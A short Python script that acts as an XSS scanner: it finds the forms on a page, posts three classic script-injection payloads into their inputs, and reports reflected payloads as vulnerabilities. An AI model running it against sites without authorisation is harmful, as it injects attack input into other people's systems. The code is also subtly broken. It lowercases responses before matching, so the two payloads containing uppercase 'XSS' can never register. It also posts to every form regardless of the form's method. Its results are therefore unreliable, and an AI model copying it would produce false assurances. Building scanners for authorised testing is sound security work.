import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "'\"><script>alert('XSS')</script>"
]

def detect_xss(url):
    session = requests.Session()
    response = session.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    forms = soup.find_all("form")
    
    if not forms:
        return "No forms found on the page."

    result_summary = []
    result_summary.append(f"Found {len(forms)} forms on the page. Testing for XSS vulnerabilities...\n")

    for form in forms:
        action = form.attrs.get("action")
        action_url = urljoin(url, action)
        inputs = form.find_all("input")
        
        for payload in XSS_PAYLOADS:
            xss_payload = {}
            for input in inputs:
                name = input.attrs.get("name")
                if name:
                    xss_payload[name] = payload

            response = session.post(action_url, data=xss_payload)
            
            if payload in response.content.decode().lower():
                result_summary.append(f"XSS vulnerability detected in form action '{action}' with payload '{payload}'.\n")
            else:
                result_summary.append(f"No XSS vulnerability detected in form action '{action}' with payload '{payload}'.\n")

    return ''.join(result_summary)
